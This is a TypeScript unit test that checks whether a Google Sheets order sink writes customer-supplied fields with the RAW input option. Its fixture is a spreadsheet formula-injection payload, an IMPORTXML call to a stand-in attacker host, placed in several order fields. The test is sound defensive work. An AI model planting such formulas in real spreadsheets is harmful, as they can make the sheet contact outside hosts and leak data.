import assert from "node:assert/strict";
import { test } from "node:test";
import { GoogleSheetsOrderSink } from "../src/googleSheets.js";

test("formula payloads in customer fields are sent only with RAW", async () => {
  const sink = new GoogleSheetsOrderSink({ spreadsheetId: "test", sheetId: 0 });
  const writes: Array<{ requestBody: { valueInputOption: string; data: Array<{ values: unknown[][] }> } }> = [];
  Object.assign(sink, {
    client: { spreadsheets: {
      get: async () => ({ data: { sheets: [{ properties: { sheetId: 0, title: "Orders" } }] } }),
      values: {
        get: async () => ({ data: {} }),
        update: async () => ({}),
        batchUpdate: async (request: typeof writes[number]) => { writes.push(request); return {}; },
      },
    } },
  });
  const payload = '=IMPORTXML("https://attacker.invalid/", "//a")';
  await sink.appendOrder({
    id: 1, telegramUserId: 1, status: "new", createdAt: new Date().toISOString(),
    fullName: payload, phone: "+79991234567", city: "Москва", vehicleInfo: payload,
    items: [{ positionNumber: 1, description: payload }],
  });
  const raw = writes.filter((request) => request.requestBody.valueInputOption === "RAW");
  assert.equal(raw.length, 1);
  assert.ok(JSON.stringify(raw).includes("attacker.invalid"));
  for (const request of writes.filter((request) => request.requestBody.valueInputOption !== "RAW")) {
    assert.equal(JSON.stringify(request).includes("attacker.invalid"), false);
  }
});
